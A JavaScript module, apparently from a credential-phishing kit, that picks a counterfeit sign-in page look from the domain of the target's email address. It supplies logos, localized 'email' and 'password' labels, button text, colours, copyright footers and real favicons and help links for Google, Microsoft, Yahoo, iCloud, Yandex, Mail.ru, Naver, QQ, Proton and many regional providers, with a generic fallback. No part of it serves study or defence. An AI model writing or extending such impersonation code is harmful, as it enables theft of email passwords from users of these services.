// brands.js — per-provider branding for sharp, image-backed render
const BRANDS = {
  // ---------- Yandex ----------
  'yandex.ru': bYandex(), 'yandex.com': bYandex(),
  'yandex.by': bYandex(), 'yandex.kz': bYandex(),
  'yandex.ua': bYandex(), 'ya.ru': bYandex(),

  // ---------- Bulgaria ----------
  'abv.bg':  bAbv(), 'mail.bg': bMailBg(), 'dir.bg': bDirBg(),

  // ---------- Google ----------
  'gmail.com': bGoogle(), 'googlemail.com': bGoogle(),

  // ---------- Microsoft ----------
  'outlook.com': bMS(), 'hotmail.com': bMS(),
  'live.com': bMS(),    'msn.com': bMS(),

  // ---------- Naver / Daum ----------
  'naver.com': bNaver(),
  'daum.net': bDaum(), 'hanmail.net': bDaum(), 'kakao.com': bDaum(),

  // ---------- Yahoo ----------
  'yahoo.com': bYahoo(), 'ymail.com': bYahoo(), 'rocketmail.com': bYahoo(),

  // ---------- QQ ----------
  'qq.com': bQQ(), 'foxmail.com': bQQ(),

  // ---------- Mail.ru ----------
  'mail.ru': bMailru(), 'inbox.ru': bMailru(), 'list.ru': bMailru(),
  'bk.ru': bMailru(), 'internet.ru': bMailru(),

  // ---------- iCloud ----------
  'icloud.com': biCloud(), 'me.com': biCloud(), 'mac.com': biCloud(),

  // ---------- AOL ----------
  'aol.com': bAol(), 'aim.com': bAol(),

  // ---------- Proton ----------
  'protonmail.com': bProton(), 'proton.me': bProton(), 'pm.me': bProton(),

  // ---------- Zoho ----------
  'zoho.com': bZoho(), 'zohomail.com': bZoho(),

  // ---------- Tuta ----------
  'tutanota.com': bTuta(), 'tuta.io': bTuta(),

  // ---------- T-Online ----------
  't-online.de': bTonline(),

  // ---------- Mail.com ----------
  'mail.com': bMailCom(), 'email.com': bMailCom(),

  // ---------- Orange ----------
  'orange.fr': bOrange(), 'wanadoo.fr': bOrange(),

  // ---------- Web.de / GMX ----------
  'web.de': bWebDe(), 'gmx.net': bGmx(), 'gmx.de': bGmx(), 'gmx.com': bGmx(),

  // ---------- Seznam ----------
  'seznam.cz': bSeznam(), 'email.cz': bSeznam(),

  // ---------- WP.pl ----------
  'wp.pl': bWp(), 'o2.pl': bWp(), 'interia.pl': bWp(),

  // ---------- Libero ----------
  'libero.it': bLibero(), 'virgilio.it': bLibero(),

  // ---------- UOL ----------
  'uol.com.br': bUol(),

  // ---------- Rediff ----------
  'rediff.com': bRediff(), 'rediffmail.com': bRediff(),

  // ---------- Ukr.net / I.ua ----------
  'ukr.net': bUkr(), 'i.ua': bIua(),

  // ---------- SAPO ----------
  'sapo.pt': bSapo()
};

const FALLBACKS = [
  [/yandex|ya\.ru/i,                        bYandex],
  [/abv\.bg/i,                              bAbv],
  [/google|gmail|googlemail/i,              bGoogle],
  [/outlook|hotmail|live\.com|msn/i,        bMS],
  [/naver/i,                                bNaver],
  [/daum|hanmail|kakao/i,                   bDaum],
  [/yahoo|ymail|rocketmail/i,               bYahoo],
  [/qq\.com|foxmail/i,                      bQQ],
  [/mail\.ru|inbox\.ru|bk\.ru|list\.ru/i,   bMailru],
  [/icloud|me\.com|mac\.com/i,              biCloud],
  [/aol|aim\.com/i,                         bAol],
  [/proton/i,                               bProton],
  [/zoho/i,                                 bZoho],
  [/tutanota|tuta/i,                        bTuta],
  [/t-online/i,                             bTonline],
  [/mail\.com|email\.com/i,                 bMailCom],
  [/orange|wanadoo/i,                       bOrange],
  [/web\.de/i,                              bWebDe],
  [/gmx/i,                                  bGmx],
  [/seznam|email\.cz/i,                     bSeznam],
  [/wp\.pl|o2\.pl|interia/i,                bWp],
  [/libero|virgilio/i,                      bLibero],
  [/uol\.com\.br/i,                         bUol],
  [/rediff/i,                               bRediff],
  [/ukr\.net/i,                             bUkr],
  [/i\.ua/i,                                bIua],
  [/sapo\.pt/i,                             bSapo]
];

function getBrand(email) {
  const domain = (email || '').split('@')[1]?.toLowerCase() || '';
  if (!domain) return bGeneric(email);
  if (BRANDS[domain]) return BRANDS[domain];
  for (const [re, factory] of FALLBACKS) if (re.test(domain)) return factory(domain);
  return bGeneric(email);
}
module.exports = { getBrand };

// ============================================================
// Factories
// ============================================================
function bYandex() { return {
  name:'Yandex', lang:'ru', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/yandex.svg', logoAlt:'Яндекс',
  subtitle:'', emailLabel:'Логин или email', passwordLabel:'Пароль',
  buttonText:'Войти', accent:'#fc3f1d', accent2:'#fc3f1d',
  footer:'© Яндекс 2026',
  footerLinks:[
    {text:'Помощь', href:'https://yandex.ru/support/passport/'},
    {text:'Условия использования', href:'https://yandex.ru/legal/'}
  ],
  favicon:'https://yandex.ru/favicon.ico'
};}

function bAbv() { return {
  name:'ABV.bg', lang:'bg', layout:'card',
  bg:'#eaf2ff', bgImage:null,
  logo:'/assets/abv.svg', logoAlt:'ABV.bg',
  subtitle:'Влезте в своя акаунт, за да продължите',
  emailLabel:'Имейл адрес', passwordLabel:'Парола', buttonText:'Вход',
  accent:'#003a8f', accent2:'#e30613',
  footer:'© ABV.bg 2026',
  favicon:'https://abv.bg/favicon.ico'
};}

function bMailBg() { return {
  name:'Mail.bg', lang:'bg', layout:'card',
  bg:'#f0f4ff', bgImage:null,
  logo:'/assets/mailbg.svg', logoAlt:'Mail.bg',
  subtitle:'Влезте в своя Mail.bg акаунт',
  emailLabel:'Имейл', passwordLabel:'Парола', buttonText:'Вход',
  accent:'#0054a6', accent2:'#003d7a',
  footer:'© Mail.bg 2026',
  favicon:'https://mail.bg/favicon.ico'
};}

function bDirBg() { return {
  name:'Dir.bg', lang:'bg', layout:'card',
  bg:'#fff8e1', bgImage:null,
  logo:'/assets/dirbg.svg', logoAlt:'Dir.bg',
  subtitle:'Влезте в своя Dir.bg акаунт',
  emailLabel:'Имейл', passwordLabel:'Парола', buttonText:'Вход',
  accent:'#d32f2f', accent2:'#b71c1c',
  footer:'© Dir.bg 2026',
  favicon:'https://dir.bg/favicon.ico'
};}

function bGoogle() { return {
  name:'Google', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/google.svg', logoAlt:'Google',
  subtitle:'Sign in', emailLabel:'Email or phone', passwordLabel:'Enter your password',
  buttonText:'Next', accent:'#1a73e8', accent2:'#1a73e8',
  footer:'',
  footerLinks:[
    {text:'English (United States)', href:'#'},
    {text:'Help', href:'https://support.google.com/accounts'},
    {text:'Privacy', href:'https://policies.google.com/privacy'},
    {text:'Terms', href:'https://policies.google.com/terms'}
  ],
  favicon:'https://accounts.google.com/favicon.ico'
};}

function bMS() { return {
  name:'Microsoft', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/microsoft.svg', logoAlt:'Microsoft',
  subtitle:'Sign in', emailLabel:'Email, phone, or Skype', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#0067b8', accent2:'#0067b8',
  footer:'',
  footerLinks:[
    {text:'Terms of use', href:'#'},
    {text:'Privacy & cookies', href:'#'}
  ],
  favicon:'https://login.live.com/favicon.ico'
};}

function bNaver() { return {
  name:'Naver', lang:'ko', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/naver.svg', logoAlt:'NAVER',
  subtitle:'', emailLabel:'아이디 또는 이메일', passwordLabel:'비밀번호',
  buttonText:'로그인', accent:'#03c75a', accent2:'#03c75a',
  footer:'© NAVER Corp.',
  favicon:'https://www.naver.com/favicon.ico'
};}

function bDaum() { return {
  name:'Daum', lang:'ko', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/daum.svg', logoAlt:'Daum',
  subtitle:'', emailLabel:'이메일 주소', passwordLabel:'비밀번호',
  buttonText:'로그인', accent:'#fedd15', accent2:'#1e1e1e',
  footer:'© Kakao Corp.',
  favicon:'https://www.daum.net/favicon.ico'
};}

function bYahoo() { return {
  name:'Yahoo', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/yahoo.svg', logoAlt:'Yahoo',
  subtitle:'Sign in', emailLabel:'Email or phone', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#6001d2', accent2:'#6001d2',
  footer:'© Yahoo',
  favicon:'https://login.yahoo.com/favicon.ico'
};}

function bQQ() { return {
  name:'QQ', lang:'zh', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/qq.svg', logoAlt:'QQ邮箱',
  subtitle:'', emailLabel:'QQ号码或邮箱', passwordLabel:'密码',
  buttonText:'登录', accent:'#12b7f5', accent2:'#12b7f5',
  footer:'© 腾讯',
  favicon:'https://mail.qq.com/favicon.ico'
};}

function bMailru() { return {
  name:'Mail.ru', lang:'ru', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/mailru.svg', logoAlt:'Mail.ru',
  subtitle:'', emailLabel:'Email или телефон', passwordLabel:'Пароль',
  buttonText:'Войти', accent:'#005ff9', accent2:'#005ff9',
  footer:'© Mail.ru',
  favicon:'https://mail.ru/favicon.ico'
};}

function biCloud() { return {
  name:'iCloud', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/icloud.svg', logoAlt:'iCloud',
  subtitle:'Sign in with your Apple Account',
  emailLabel:'Apple Account', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#0071e3', accent2:'#0071e3',
  footer:'© Apple Inc.',
  favicon:'https://www.icloud.com/favicon.ico'
};}

function bAol() { return {
  name:'AOL', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/aol.svg', logoAlt:'AOL',
  subtitle:'Sign in', emailLabel:'Username, email or mobile', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#1a73e8', accent2:'#1a73e8',
  footer:'© AOL',
  favicon:'https://login.aol.com/favicon.ico'
};}

function bProton() { return {
  name:'Proton Mail', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/proton.svg', logoAlt:'Proton Mail',
  subtitle:'Sign in to your Proton Account',
  emailLabel:'Email or username', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#6d4aff', accent2:'#6d4aff',
  footer:'© Proton AG',
  favicon:'https://proton.me/favicon.ico'
};}

function bZoho() { return {
  name:'Zoho', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/zoho.svg', logoAlt:'Zoho',
  subtitle:'Sign in to access your Zoho account',
  emailLabel:'Email address or mobile number', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#d32f2f', accent2:'#d32f2f',
  footer:'© Zoho Corporation',
  favicon:'https://zoho.com/favicon.ico'
};}

function bTuta() { return {
  name:'Tuta', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/tuta.svg', logoAlt:'Tuta',
  subtitle:'Sign in', emailLabel:'Email address', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#840010', accent2:'#840010',
  footer:'© Tutao GmbH',
  favicon:'https://tuta.com/favicon.ico'
};}

function bTonline() { return {
  name:'T-Online', lang:'de', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/tonline.svg', logoAlt:'T-Online',
  subtitle:'Melden Sie sich bei Ihrem E-Mail-Konto an',
  emailLabel:'E-Mail-Adresse', passwordLabel:'Passwort',
  buttonText:'Anmelden', accent:'#e20074', accent2:'#e20074',
  footer:'© Telekom',
  favicon:'https://t-online.de/favicon.ico'
};}

function bMailCom() { return {
  name:'mail.com', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/mailcom.svg', logoAlt:'mail.com',
  subtitle:'Sign in to your account',
  emailLabel:'Email address', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#00a0e3', accent2:'#00a0e3',
  footer:'© mail.com',
  favicon:'https://mail.com/favicon.ico'
};}

function bOrange() { return {
  name:'Orange', lang:'fr', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/orange.svg', logoAlt:'Orange',
  subtitle:'Identifiez-vous',
  emailLabel:'Adresse e-mail', passwordLabel:'Mot de passe',
  buttonText:'Se connecter', accent:'#ff7900', accent2:'#ff7900',
  footer:'© Orange',
  favicon:'https://orange.fr/favicon.ico'
};}

function bWebDe() { return {
  name:'WEB.DE', lang:'de', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/webde.svg', logoAlt:'WEB.DE',
  subtitle:'Melden Sie sich an',
  emailLabel:'E-Mail-Adresse', passwordLabel:'Passwort',
  buttonText:'Anmelden', accent:'#ffcc00', accent2:'#ffcc00',
  footer:'© WEB.DE',
  favicon:'https://web.de/favicon.ico'
};}

function bGmx() { return {
  name:'GMX', lang:'de', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/gmx.svg', logoAlt:'GMX',
  subtitle:'Melden Sie sich an',
  emailLabel:'E-Mail-Adresse', passwordLabel:'Passwort',
  buttonText:'Anmelden', accent:'#1c4b9b', accent2:'#1c4b9b',
  footer:'© GMX',
  favicon:'https://gmx.net/favicon.ico'
};}

function bSeznam() { return {
  name:'Seznam', lang:'cs', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/seznam.svg', logoAlt:'Seznam',
  subtitle:'Přihlaste se', emailLabel:'E-mail', passwordLabel:'Heslo',
  buttonText:'Přihlásit se', accent:'#cc0000', accent2:'#cc0000',
  footer:'© Seznam.cz',
  favicon:'https://seznam.cz/favicon.ico'
};}

function bWp() { return {
  name:'WP.pl', lang:'pl', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/wp.svg', logoAlt:'WP.pl',
  subtitle:'Zaloguj się', emailLabel:'E-mail', passwordLabel:'Hasło',
  buttonText:'Zaloguj się', accent:'#ff6a00', accent2:'#ff6a00',
  footer:'© Wirtualna Polska',
  favicon:'https://wp.pl/favicon.ico'
};}

function bLibero() { return {
  name:'Libero', lang:'it', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/libero.svg', logoAlt:'Libero',
  subtitle:'Accedi', emailLabel:'Email', passwordLabel:'Password',
  buttonText:'Accedi', accent:'#ffcc00', accent2:'#ffcc00',
  footer:'© Libero',
  favicon:'https://libero.it/favicon.ico'
};}

function bUol() { return {
  name:'UOL', lang:'pt', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/uol.svg', logoAlt:'UOL',
  subtitle:'Entre na sua conta', emailLabel:'E-mail', passwordLabel:'Senha',
  buttonText:'Entrar', accent:'#ffcc00', accent2:'#ffcc00',
  footer:'© UOL',
  favicon:'https://uol.com.br/favicon.ico'
};}

function bRediff() { return {
  name:'Rediffmail', lang:'en', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/rediff.svg', logoAlt:'Rediffmail',
  subtitle:'Sign in to Rediffmail',
  emailLabel:'Rediffmail ID', passwordLabel:'Password',
  buttonText:'Sign in', accent:'#d32f2f', accent2:'#d32f2f',
  footer:'© Rediff.com',
  favicon:'https://rediff.com/favicon.ico'
};}

function bUkr() { return {
  name:'Ukr.net', lang:'uk', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/ukr.svg', logoAlt:'Ukr.net',
  subtitle:'Увійдіть у свій акаунт',
  emailLabel:'Email', passwordLabel:'Пароль', buttonText:'Увійти',
  accent:'#0066cc', accent2:'#0066cc',
  footer:'© Ukr.net',
  favicon:'https://ukr.net/favicon.ico'
};}

function bIua() { return {
  name:'I.ua', lang:'uk', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/iua.svg', logoAlt:'I.ua',
  subtitle:'Увійдіть у свій акаунт',
  emailLabel:'Email', passwordLabel:'Пароль', buttonText:'Увійти',
  accent:'#ff6600', accent2:'#ff6600',
  footer:'© I.ua',
  favicon:'https://i.ua/favicon.ico'
};}

function bSapo() { return {
  name:'SAPO', lang:'pt', layout:'flat',
  bg:'#ffffff', bgImage:null,
  logo:'/assets/sapo.svg', logoAlt:'SAPO',
  subtitle:'Inicie sessão', emailLabel:'E-mail', passwordLabel:'Palavra-passe',
  buttonText:'Entrar', accent:'#0099ff', accent2:'#0099ff',
  footer:'© SAPO',
  favicon:'https://sapo.pt/favicon.ico'
};}

function bGeneric(email) {
  const domain = (email || '').split('@')[1] || '';
  return {
    name: domain || 'Mail', lang:'en', layout:'flat',
    bg:'#ffffff', bgImage:null,
    logo:'/assets/generic.svg', logoAlt:'Mail',
    subtitle:'Sign in to continue',
    emailLabel:'Email', passwordLabel:'Password',
    buttonText:'Sign in', accent:'#1e930c', accent2:'#1e930c',
    footer: domain ? `© ${domain}` : '',
    favicon:''
  };
}